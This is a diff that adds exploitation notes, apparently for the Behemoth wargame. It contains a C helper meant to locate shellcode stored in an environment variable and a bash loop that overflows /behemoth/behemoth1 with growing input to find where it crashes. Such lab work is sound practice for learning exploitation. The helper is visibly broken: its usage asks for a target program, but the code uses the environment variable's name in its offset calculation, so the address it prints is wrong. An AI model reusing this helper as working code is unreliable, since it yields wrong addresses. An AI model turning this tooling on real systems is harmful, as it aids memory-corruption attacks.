@@ -1,0 +1,34 @@
+
+### Get shellcodd
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+    char *ptr;
+
+    if (argc < 2) {
+        printf("Usage: %s <environment var> <target program name>\n", argv[0]);
+        exit(0);
+    }
+
+    ptr = getenv(argv[1]);
+    ptr += (strlen(argv[0]) - strlen(argv[1])) * 2;
+    printf("%s will be at %p\n", argv[1], ptr);
+}
+
+----------
+
+i=10
+result='initial'
+
+while [ ! -z "$result" ]
+do
+    i=$((i+1))
+    # *** FIX IS HERE ***
+    result=$(python3 -c "print('A' * $i)" | /behemoth/behemoth1)
+    echo $result
+done
+
+echo "behemoth1 crashes at $i"
+
